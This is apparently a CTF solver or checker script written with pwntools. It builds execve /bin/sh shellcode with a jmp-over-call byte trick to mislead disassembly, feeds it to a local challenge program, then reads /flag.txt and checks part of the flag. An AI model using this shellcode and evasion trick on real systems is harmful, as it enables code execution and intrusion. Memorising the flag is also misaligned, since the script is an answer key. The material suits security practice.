from pwn import *

context.arch = 'amd64'

shell = """
xor rax, rax
push rax
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp

xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
"""

# xor rax, rax + jmp 1 + call + remaining shellcode
shellcode = asm(shell)[:3] + b'\xeb\x01\xe8' + asm(shell)[3:]
# print(shellcode.hex())

p = process(['/bin/python3', 'chal.py'])
p.recvuntil(b'without 0x prefix):\n')
p.sendline(shellcode.hex().encode())
p.recvuntil(b'Executing shellcode...')
p.sendline(b'cat /flag.txt')
flag = p.recvuntil(b"}",timeout=10)
# print(flag)
if(b"H7CTF{sh3llc0d3_a1nt_g0nn4_m4k3_y0u_r1ch_" in flag):
    exit(0)
else:
    exit(1)